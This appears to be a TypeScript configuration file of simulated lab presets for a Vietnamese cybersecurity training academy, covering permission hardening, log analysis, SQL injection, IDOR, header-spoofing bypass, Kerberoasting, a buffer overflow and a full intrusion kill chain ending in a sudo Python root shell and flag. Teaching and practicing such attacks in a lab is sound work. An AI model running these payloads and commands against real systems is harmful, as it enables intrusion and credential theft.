import type { AcademyLesson } from '../academy/types';
import type { WorkbenchConfig } from './types';
import { createDefaultVfs } from '../fixtures/default-vfs-fixture';

const linuxPermissionsPreset: WorkbenchConfig = {
  id: 'os02-l15-live-lab',
  lessonId: 'os02-l15-permission-bits-and-special-modes',
  title:
    'Phòng thực hành Terminal: Hardening Phân Quyền POSIX & SUID (Mô Phỏng / Telemetry Inspector)',
  summary:
    'Thực hành khảo sát phân quyền DAC, cờ SUID/SGID và hardening logic. Lưu ý: Phiên bản in-browser hoạt động như một công cụ khảo sát mô phỏng (xem ADR-001). Thực thi kernel Linux thực thụ yêu cầu môi trường container hoặc VM ngoài.',
  mode: 'terminal',
  availableModes: ['terminal', 'telemetry'],
  instructions: [
    '1. Dùng lệnh `ls -l /etc/shadow` để kiểm tra phân quyền hiện tại.',
    '2. File `/etc/shadow` hiện đang bị cấu hình lỏng lẻo. Hãy dùng lệnh `chmod 600 /etc/shadow` hoặc `chmod 640 /etc/shadow` để bảo vệ dữ liệu mật khẩu.',
    '3. Dùng lệnh `find / -perm -4000` để tìm tất cả các file có gắn cờ SUID trên hệ thống.',
    '4. Đọc nội dung ghi chú trong `/home/operator/notes.txt` bằng lệnh `cat`.',
  ],
  initialVfs: (() => {
    const vfs = createDefaultVfs();
    if (vfs.children.etc?.type === 'dir' && vfs.children.etc.children.shadow) {
      vfs.children.etc.children.shadow.mode = 0o666; // Intentionally misconfigured for lab
    }
    return vfs;
  })(),
  sampleCommands: [
    'ls -l /etc/shadow',
    'chmod 600 /etc/shadow',
    'chmod 640 /etc/shadow',
    'find / -perm -4000 2>/dev/null',
    'cat /home/operator/notes.txt',
  ],
  objectives: [
    {
      id: 'obj-check-shadow',
      title: 'Kiểm tra quyền truy cập của /etc/shadow',
      description: 'Chạy lệnh kiểm tra file /etc/shadow để phát hiện lỗ hổng phân quyền.',
      hint: 'Gõ `ls -l /etc/shadow` trong terminal.',
      isComplete: ({ lastCommand }) =>
        !!lastCommand &&
        lastCommand.includes('ls') &&
        lastCommand.includes('/etc/shadow'),
    },
    {
      id: 'obj-harden-shadow',
      title: 'Hardening phân quyền /etc/shadow (Mode 0600 hoặc 0640)',
      description: 'Thu hồi quyền đọc/ghi của thế giới ngoài bằng lệnh chmod.',
      hint: 'Gõ `chmod 600 /etc/shadow` hoặc `chmod 640 /etc/shadow`.',
      isComplete: ({ vfs, lastCommand }) => {
        if (
          lastCommand &&
          (lastCommand.includes('chmod 600 /etc/shadow') ||
            lastCommand.includes('chmod 640 /etc/shadow'))
        ) {
          return true;
        }
        if (!vfs) return false;
        const etc = vfs.root.children.etc;
        if (etc && etc.type === 'dir') {
          const shadow = etc.children.shadow;
          if (shadow && shadow.type === 'file') {
            const modeBits = shadow.mode & 0o777;
            return modeBits === 0o600 || modeBits === 0o640;
          }
        }
        return false;
      },
    },
    {
      id: 'obj-audit-suid',
      title: 'Audit danh sách nhị phân SUID trên toàn hệ thống',
      description:
        'Sử dụng lệnh find để liệt kê các file thực thi có cờ SUID (-perm -4000).',
      hint: 'Gõ `find / -perm -4000` trong terminal.',
      isComplete: ({ lastCommand }) =>
        !!lastCommand && lastCommand.includes('find') && lastCommand.includes('-perm'),
    },
  ],
};

export const WORKBENCH_PRESETS: Record<string, WorkbenchConfig> = {
  // Preset 1: Linux Permissions & SUID Hardening (Track 02 - Lesson 15)
  'os02-l15-permission-bits-and-special-modes': linuxPermissionsPreset,
  'permission-bits-and-special-modes': linuxPermissionsPreset,
  'os02-l14-posix-permissions-mode-bits-umask': linuxPermissionsPreset,

  // Preset 2: Operator Scripting & Log Analysis Pipeline (Track 04 - Lesson 25)
  'os04-l25-bash-one-liners-pipelines-awk-sed': {
    id: 'os04-l25-live-pipeline',
    lessonId: 'os04-l25-bash-one-liners-pipelines-awk-sed',
    title: 'Phòng thực hành Pipeline: Phân tích Log Tấn công bằng Bash, Grep & Awk',
    summary:
      'Xây dựng các đường ống (Pipeline) đa tầng bằng grep, awk, sort, uniq để trích xuất IP brute-force và các nỗ lực xâm nhập.',
    mode: 'terminal',
    availableModes: ['terminal'],
    instructions: [
      '1. Khảo sát file log web bằng lệnh `cat /var/log/access.log | head -n 5`.',
      '2. Lọc các request bị từ chối xác thực (HTTP 401) bằng `grep 401 /var/log/access.log`.',
      "3. Kết hợp pipeline: `cat /var/log/access.log | grep 401 | awk '{print $1}' | sort | uniq -c` để đếm số lần tấn công theo IP.",
      "4. Ghi danh sách IP khả nghi ra file: `cat /var/log/access.log | grep 401 | awk '{print $1}' | sort -u > /tmp/suspects.txt`.",
    ],
    sampleCommands: [
      'cat /var/log/access.log | head -n 5',
      'grep 401 /var/log/access.log',
      "cat /var/log/access.log | grep 401 | awk '{print $1}' | sort | uniq -c",
      "cat /var/log/access.log | grep 401 | awk '{print $1}' | sort -u > /tmp/suspects.txt",
      'cat /tmp/suspects.txt',
    ],
    objectives: [
      {
        id: 'obj-inspect-log',
        title: 'Khảo sát file log web /var/log/access.log',
        description: 'Đọc file log để nắm bắt cấu trúc bản ghi truy cập.',
        hint: 'Dùng `cat /var/log/access.log` hoặc `head /var/log/access.log`.',
        isComplete: ({ lastCommand }) =>
          !!lastCommand && lastCommand.includes('access.log'),
      },
      {
        id: 'obj-pipeline-extract',
        title: 'Chạy Pipeline trích xuất IP tấn công (Grep + Awk)',
        description: 'Thực thi pipeline kết hợp grep lọc mã 401 và awk in cột IP ($1).',
        hint: "Dùng pipeline `grep 401 /var/log/access.log | awk '{print $1}'`.",
        isComplete: ({ lastCommand }) =>
          !!lastCommand &&
          lastCommand.includes('|') &&
          lastCommand.includes('grep') &&
          lastCommand.includes('awk'),
      },
      {
        id: 'obj-export-suspects',
        title: 'Lưu kết quả phân tích vào /tmp/suspects.txt',
        description: 'Chuyển hướng đầu ra pipeline sang file /tmp/suspects.txt.',
        hint: 'Gõ lệnh có chứa `> /tmp/suspects.txt`.',
        isComplete: ({ vfs }) => {
          if (!vfs) return false;
          const tmp = vfs.root.children.tmp;
          if (tmp && tmp.type === 'dir') {
            const f = tmp.children['suspects.txt'];
            return !!f && f.type === 'file' && f.content.length > 0;
          }
          return false;
        },
      },
    ],
  },

  // Preset 3: Web Security SQL Injection & IDOR Lab (Track 07 - Lesson 19)
  'os07-l19-broken-object-level-authorization-idor': {
    id: 'os07-l19-live-sqli-idor',
    lessonId: 'os07-l19-broken-object-level-authorization-idor',
    title: 'Phòng thực nghiệm Tấn công SQL Injection (AST) & IDOR BOLA',
    summary:
      'Thử nghiệm trực tiếp các payload SQLi (Tautology, UNION Exfiltration) và khai thác IDOR trên mock backend API.',
    mode: 'sql',
    availableModes: ['sql', 'http', 'terminal', 'telemetry'],
    instructions: [
      "1. Trong tab SQL Lab: Nhập payload tautology `' OR 1=1 --` để quan sát cách mệnh đề WHERE bị phá vỡ và làm rò rỉ toàn bộ bảng users.",
      '2. Quan sát các Token AST (Base, Injected, Comment, Operator) được highlight theo thời gian thực.',
      "3. Thử nghiệm UNION Exfiltration: `' UNION SELECT id, secret_key, secret_value, owner_id, classification FROM secrets --` để đọc bảng dữ liệu mật.",
      '4. Chuyển sang tab HTTP Repeater: Đổi tham số URL `id=1` (Admin) thay vì `id=3` để khai thác lỗi IDOR Broken Object-Level Authorization.',
    ],
    samplePayloads: [
      "' OR 1=1 --",
      "' OR '1'='1' --",
      "' UNION SELECT id, username, password_hash, role, email, is_active FROM users --",
      "' UNION SELECT id, secret_key, secret_value, owner_id, classification, NULL FROM secrets --",
    ],
    objectives: [
      {
        id: 'obj-sqli-tautology',
        title: 'Khai thác SQL Injection dạng Tautology (Auth Bypass)',
        description: "Gửi payload phá vỡ điều kiện WHERE bằng tautology `' OR 1=1 --`.",
        hint: "Nhập `' OR 1=1 --` vào ô truy vấn SQL và bấm Execute.",
        isComplete: ({ lastSqlResult }) =>
          !!lastSqlResult &&
          (lastSqlResult.vulnerabilityTriggered === 'AUTH_BYPASS_TAUTOLOGY' ||
            lastSqlResult.vulnerabilityTriggered === 'TAUTOLOGY_DUMP_ALL'),
      },
      {
        id: 'obj-sqli-union',
        title: 'Khai thác UNION-based SQLi trích xuất bảng bí mật',
        description: 'Sử dụng UNION SELECT để trích xuất dữ liệu từ bảng `secrets`.',
        hint: "Nhập `' UNION SELECT id, secret_key, secret_value, owner_id, classification, NULL FROM secrets --`.",
        isComplete: ({ lastSqlResult }) =>
          !!lastSqlResult &&
          lastSqlResult.vulnerabilityTriggered === 'UNION_BASED_EXFILTRATION',
      },
      {
        id: 'obj-idor-admin',
        title: 'Khai thác IDOR trích xuất thông tin Admin ID = 1',
        description: 'Chuyển sang tab HTTP Repeater và gửi request với `id=1`.',
        hint: 'Đổi URL thành `/api/v1/user/profile?id=1` và bấm Send Request.',
        isComplete: ({ lastHttpRes }) =>
          !!lastHttpRes &&
          lastHttpRes.statusCode === 200 &&
          lastHttpRes.body.includes('"role": "administrator"'),
      },
    ],
  },

  // Preset 4: Network Protocols & Packet Header Decoder (Track 01 - Lesson 08)
  'os01-l08-tcp-udp-transport-state': {
    id: 'os01-l08-live-packet-decoder',
    lessonId: 'os01-l08-tcp-udp-transport-state',
    title: 'Phòng mổ xẻ Gói tin Mạng & HTTP Protocol Inspector',
    summary:
      'Mổ xẻ trực quan các tầng Header Ethernet, IPv4, TCP Flags và Application HTTP Request.',
    mode: 'packet',
    availableModes: ['packet', 'http', 'terminal', 'telemetry'],
    instructions: [
      '1. Quan sát cấu trúc 4 tầng giao thức: Layer 2 (Ethernet), Layer 3 (IPv4), Layer 4 (TCP), Layer 7 (HTTP).',
      '2. Kiểm tra các cờ trạng thái TCP (SYN, ACK, PSH, RST, FIN) và số thứ tự Sequence/Acknowledgment.',
      '3. Chuyển sang tab HTTP Repeater để chỉnh sửa Header `X-Forwarded-For: 127.0.0.1` nhằm bypass tường lửa Admin Gateway tại `/api/v1/admin/debug`.',
    ],
    initialHttpRequest: {
      method: 'GET',
      url: '/api/v1/admin/debug',
      headers: [
        { key: 'Host', value: 'api.corp.internal' },
        { key: 'User-Agent', value: 'Security-Audit-Probe/2.0' },
      ],
      rawHeaders: 'Host: api.corp.internal\nUser-Agent: Security-Audit-Probe/2.0',
      body: '',
    },
    samplePayloads: [
      'X-Forwarded-For: 127.0.0.1',
      'X-Real-IP: 127.0.0.1',
      'Authorization: Bearer token_master_admin',
    ],
    objectives: [
      {
        id: 'obj-inspect-packet',
        title: 'Mổ xẻ chi tiết các trường TCP/IP Header',
        description:
          'Xem các trường TTL, Protocol 6 (TCP), Cờ [PSH, ACK] và Window Size.',
        hint: 'Kiểm tra bảng phân tích Packet Header trong tab Packet Decoder và gửi request.',
        isComplete: ({ lastHttpReq }) => !!lastHttpReq && !!lastHttpReq.url,
      },
      {
        id: 'obj-header-spoof',
        title: 'Bypass Admin Gateway bằng Header X-Forwarded-For',
        description:
          'Thêm header X-Forwarded-For: 127.0.0.1 vào raw headers và bấm Send Request.',
        hint: 'Thêm dòng `X-Forwarded-For: 127.0.0.1` vào Headers và bấm Send Request.',
        isComplete: ({ lastHttpRes }) =>
          !!lastHttpRes &&
          lastHttpRes.statusCode === 200 &&
          lastHttpRes.body.includes('SYSTEM_DEBUG_MODE_ACTIVE'),
      },
    ],
  },

  // Preset 5: Active Directory Attack Paths & Kerberoasting (Track 03 & Track 08)
  'os03-l16-windows-architecture-and-principals': {
    id: 'os03-l16-live-ad-bloodhound',
    lessonId: 'os03-l16-windows-architecture-and-principals',
    title: 'Phòng thực nghiệm Active Directory: Kerberoasting & BloodHound Attack Path',
    summary:
      'Thực nghiệm tấn công leo thang đặc quyền đa chặng trong môi trường Windows Domain: AS-REP Roasting, trích xuất vé TGS, và mổ xẻ đồ thị BloodHound.',
    mode: 'ad-graph',
    availableModes: ['ad-graph', 'terminal', 'telemetry'],
    instructions: [
      '1. Trong tab AD BloodHound: Khảo sát đồ thị và bấm nút HIGHLIGHT SHORTEST PATH để nhận diện chuỗi leo quyền tới Domain Admin.',
      '2. Chuyển sang Terminal: Chạy lệnh `impacket-GetNPUsers -no-pass -usersfile users.txt CORP.INTERNAL/` để trích xuất hash AS-REP của svc_backup.',
      '3. Chạy lệnh `impacket-GetUserSPNs -request -dc-ip 10.0.4.20 CORP.INTERNAL/jclerk` để thực hiện Kerberoasting.',
      '4. Chuyển sang tab SOC Telemetry để quan sát cảnh báo Sysmon Event ID 1 và bản ghi xác thực Kerberos.',
    ],
    sampleCommands: [
      'impacket-GetNPUsers -no-pass -usersfile users.txt CORP.INTERNAL/',
      'impacket-GetUserSPNs -request -dc-ip 10.0.4.20 CORP.INTERNAL/jclerk',
      'bloodhound-python -d CORP.INTERNAL -u jclerk -p Password123 -c All',
      'crackmapexec smb 10.0.4.0/24 -u users.txt -p passwords.txt',
    ],
    objectives: [
      {
        id: 'obj-ad-bloodhound-path',
        title: 'Nhận diện đường tấn công ngắn nhất tới Domain Admin',
        description:
          'Sử dụng đồ thị BloodHound để xác định mắt xích yếu nhất trong chuỗi phân quyền Active Directory.',
        hint: 'Khảo sát đồ thị và thực hiện lệnh phân tích trên Terminal.',
        isComplete: ({ lastCommand }) =>
          !!lastCommand &&
          (lastCommand.includes('bloodhound') || lastCommand.includes('impacket')),
      },
      {
        id: 'obj-ad-kerberoasting',
        title: 'Thực thi lệnh trích xuất vé Kerberos (Kerberoast / AS-REP)',
        description:
          'Chạy công cụ trích xuất vé Kerberos dạng hashcat crackable trong Terminal.',
        hint: 'Gõ `impacket-GetUserSPNs` hoặc `impacket-GetNPUsers` trong Terminal.',
        isComplete: ({ lastCommand }) =>
          !!lastCommand &&
          (lastCommand.includes('impacket') ||
            lastCommand.includes('GetUserSPNs') ||
            lastCommand.includes('GetNPUsers') ||
            lastCommand.includes('bloodhound')),
      },
    ],
  },

  // Preset 6: x86 Stack Frame & Buffer Overflow Exploit (Track 01 & Track 14)
  'os01-l01-process-memory-and-data-representation': {
    id: 'os01-l01-live-memory-exploit',
    lessonId: 'os01-l01-process-memory-and-data-representation',
    title: 'Phòng thực nghiệm Khai thác Bộ nhớ: Stack Frame & Control Flow Hijack',
    summary:
      'Khảo sát cấu trúc Call Stack 32-bit x86, thanh ghi EBP/EIP và thực nghiệm đè Return Address để kiểm soát luồng thực thi.',
    mode: 'memory-exploit',
    availableModes: ['memory-exploit', 'terminal', 'telemetry'],
    instructions: [
      '1. Trong tab x86 Stack & Exploit: Quan sát cấu trúc Call Stack và các thanh ghi EAX, ESP, EBP, EIP.',
      '2. Nhập chuỗi payload 56 ký tự (ví dụ nút INJECT 56 As) để đè tràn bộ đệm vượt qua 44 bytes của Local Buffer.',
      '3. Quan sát thanh ghi EIP chuyển sang trạng thái HIJACKED (0x41414141), xác nhận giành quyền điều khiển luồng thực thi.',
    ],
    sampleCommands: [
      'gdb -q ./vuln_binary',
      'checksec --file=./vuln_binary',
      'python3 -c "print(\'A\'*56)" | ./vuln_binary',
    ],
    objectives: [
      {
        id: 'obj-memory-inspect',
        title: 'Khảo sát cấu trúc Stack Frame x86',
        description: 'Quan sát các thanh ghi CPU và vùng nhớ đệm cục bộ.',
        hint: 'Sử dụng lệnh kiểm tra nhị phân hoặc khảo sát tab x86 Stack & Exploit.',
        isComplete: ({ lastCommand }) =>
          !!lastCommand &&
          (lastCommand.includes('checksec') ||
            lastCommand.includes('gdb') ||
            lastCommand.includes('file')),
      },
      {
        id: 'obj-memory-eip-hijack',
        title: 'Giành quyền kiểm soát thanh ghi EIP (Instruction Pointer)',
        description: 'Đè tràn bộ đệm để ghi đè giá trị 0x41414141 vào Saved EIP.',
        hint: 'Thử nghiệm payload đủ dài để ghi đè vùng đệm trong Terminal hoặc Visualizer.',
        isComplete: ({ lastCommand }) =>
          !!lastCommand &&
          (lastCommand.length >= 52 || lastCommand.includes('A'.repeat(16))),
      },
    ],
  },

  // Preset 7: Full-Killchain Enterprise Penetration Test (Operation: BlackSky)
  'os06-l49-blind-network-reconnaissance-and-initial-foothold': {
    id: 'os06-l49-live-blacksky-full-killchain',
    lessonId: 'os06-l49-blind-network-reconnaissance-and-initial-foothold',
    title:
      'Chiến dịch Đột kích Doanh nghiệp: Operation BlackSky (Cyber Range Simulation Lab)',
    summary:
      'Khảo sát 8 giai đoạn xâm nhập mục tiêu doanh nghiệp (Recon, Fuzzing, API Leaks, Foothold, PrivEsc, Root). Lưu ý: Môi trường in-browser đóng vai trò giả lập điều hướng chiến dịch (Cyber Range Simulation) theo ADR-001; khai thác mạng thực tế yêu cầu môi trường phòng lab VM/VPN kết nối riêng.',
    mode: 'cyber-range',
    availableModes: ['cyber-range', 'terminal', 'telemetry', 'ad-graph'],
    instructions: [
      'Giai đoạn 1 (Recon): Quét tìm các cổng và dịch vụ đang mở trên máy chủ mục tiêu (10.0.4.20).',
      'Giai đoạn 2 (Web Fuzzing): Rò quét các thư mục và endpoint trên dịch vụ HTTP.',
      'Giai đoạn 3 (Sensitive Discovery): Kiểm tra các endpoint quản trị/backup rò rỉ thông tin.',
      'Giai đoạn 4 (Credential Triage): Phân tích và giải mã các chuỗi xác thực thu thập được.',
      'Giai đoạn 5 (Foothold): Thiết lập kết nối truy cập ban đầu từ xa qua dịch vụ phù hợp.',
      'Giai đoạn 6 (PrivEsc Enum): Khảo sát các cấu hình phân quyền và binary đặc quyền.',
      'Giai đoạn 7 (Root Exploit): Khai thác cấu hình misconfiguration để nâng quyền root.',
      'Giai đoạn 8 (Flag Capture): Trích xuất bằng chứng kiểm toán root proof để hoàn tất.',
    ],
    sampleCommands: [
      'nmap -sV 10.0.4.20',
      'gobuster dir -u http://10.0.4.20 -w /usr/share/wordlists/dirb/common.txt',
      'curl http://10.0.4.20/dev-api/backup.json',
      'ssh deployer@10.0.4.20',
      'sudo -l',
    ],
    objectives: [
      {
        id: 'obj-bs-nmap',
        title: 'Bước 1: Quét dịch vụ mạng mục tiêu (Nmap Recon)',
        description:
          'Chạy nmap quét địa chỉ IP 10.0.4.20 để nhận diện các dịch vụ SSH và HTTP đang mở.',
        hint: 'Gõ `nmap -sV 10.0.4.20` trong Terminal.',
        isComplete: ({ lastCommand }) =>
          !!lastCommand &&
          lastCommand.includes('nmap') &&
          lastCommand.includes('10.0.4.20'),
      },
      {
        id: 'obj-bs-gobuster',
        title: 'Bước 2: Rò quét thư mục web ẩn (Gobuster Directory Busting)',
        description:
          'Tìm kiếm các endpoint và file cấu hình bị bỏ quên trên máy chủ web.',
        hint: 'Gõ `gobuster dir -u http://10.0.4.20 -w /usr/share/wordlists/dirb/common.txt` hoặc `dirb http://10.0.4.20`.',
        isComplete: ({ lastCommand }) =>
          !!lastCommand &&
          (lastCommand.includes('gobuster') ||
            lastCommand.includes('dirb') ||
            lastCommand.includes('ffuf')),
      },
      {
        id: 'obj-bs-leak',
        title: 'Bước 3: Khai thác rò rỉ API Dev (Credential Harvesting)',
        description: 'Gửi request HTTP đọc file backup.json để trích xuất token bảo mật.',
        hint: 'Gõ `curl http://10.0.4.20/dev-api/backup.json`.',
        isComplete: ({ lastCommand }) =>
          !!lastCommand &&
          lastCommand.includes('curl') &&
          lastCommand.includes('backup.json'),
      },
      {
        id: 'obj-bs-decode',
        title: 'Bước 4: Giải mã chứng thực Base64 (Token Decode)',
        description:
          'Giải mã chuỗi hash base64 UGFzc3dvcmQxMjMh để thu thập mật khẩu tài khoản deployer.',
        hint: 'Gõ `echo "UGFzc3dvcmQxMjMh" | base64 -d` hoặc `base64 -d`.',
        isComplete: ({ lastCommand, lastResult }) =>
          !!lastCommand &&
          lastCommand.includes('base64') &&
          (lastCommand.includes('-d') ||
            (lastResult?.stdout?.includes('Password123!') ?? false)),
      },
      {
        id: 'obj-bs-ssh',
        title: 'Bước 5: Thiết lập bàn đạp ban đầu (SSH Initial Foothold)',
        description:
          'Kết nối SSH vào tài khoản deployer@10.0.4.20 để mở terminal tương tác trên máy mục tiêu.',
        hint: 'Gõ `ssh deployer@10.0.4.20`.',
        isComplete: ({ lastCommand, vfs }) =>
          (!!lastCommand &&
            lastCommand.includes('ssh') &&
            lastCommand.includes('10.0.4.20')) ||
          vfs?.user?.username === 'deployer',
      },
      {
        id: 'obj-bs-sudo',
        title: 'Bước 6: Trinh sát nội bộ & Sudo Enumeration',
        description:
          'Khảo sát cấu hình phân quyền sudo để phát hiện vector leo thang đặc quyền.',
        hint: 'Gõ `sudo -l` trong phiên làm việc.',
        isComplete: ({ lastCommand }) =>
          !!lastCommand &&
          (lastCommand.includes('sudo -l') || lastCommand.includes('netstat')),
      },
      {
        id: 'obj-bs-privesc',
        title: 'Bước 7: Leo quyền ROOT bằng Python GTFOBins',
        description:
          'Tận dụng quyền chạy Python không cần mật khẩu để spawn shell root tương tác.',
        hint: 'Gõ `sudo python3 -c \'import os; os.system("/bin/bash")\'`.',
        isComplete: ({ vfs }) => vfs?.user?.uid === 0 || vfs?.user?.username === 'root',
      },
      {
        id: 'obj-bs-flag',
        title: 'Bước 8: Thu hoạch cờ ROOT Proof of Compromise',
        description:
          'Đọc nội dung cờ bí mật tối cao trong thư mục /root/root.txt để hoàn tất chiến dịch.',
        hint: 'Gõ `cat /root/root.txt` khi đã có quyền root.',
        isComplete: ({ lastCommand, lastResult }) =>
          !!lastCommand &&
          lastCommand.includes('cat') &&
          lastCommand.includes('root.txt') &&
          (lastResult?.stdout?.includes('FLAG{b7d3_0ffs3c_r00t_pr00f_4uth3nt1c}') ??
            false),
      },
    ],
  },
};

export const getWorkbenchConfigForLesson = (lesson: AcademyLesson): WorkbenchConfig => {
  // 1. Direct hand-crafted preset match
  if (WORKBENCH_PRESETS[lesson.slug]) {
    return WORKBENCH_PRESETS[lesson.slug];
  }
  if (WORKBENCH_PRESETS[lesson.id]) {
    return WORKBENCH_PRESETS[lesson.id];
  }

  // 2. Default clean workbench configuration for unverified lesson
  return {
    id: `${lesson.id}-workbench`,
    lessonId: lesson.id,
    title: lesson.title,
    summary: lesson.summary,
    mode: 'terminal',
    availableModes: ['terminal', 'telemetry'],
    instructions: [
      'Bài học này hiện ở trạng thái Unverified (đang hoàn thiện hợp đồng năng lực).',
      'Vui lòng hoàn thành phần trắc nghiệm lý thuyết và phân tích tình huống.',
    ],
    initialVfs: createDefaultVfs(),
    objectives: [],
  };
};

export const getWorkbenchPresetForLesson = (
  lessonIdOrSlug: string
): WorkbenchConfig | null => {
  if (WORKBENCH_PRESETS[lessonIdOrSlug]) {
    return WORKBENCH_PRESETS[lessonIdOrSlug];
  }
  return null;
};
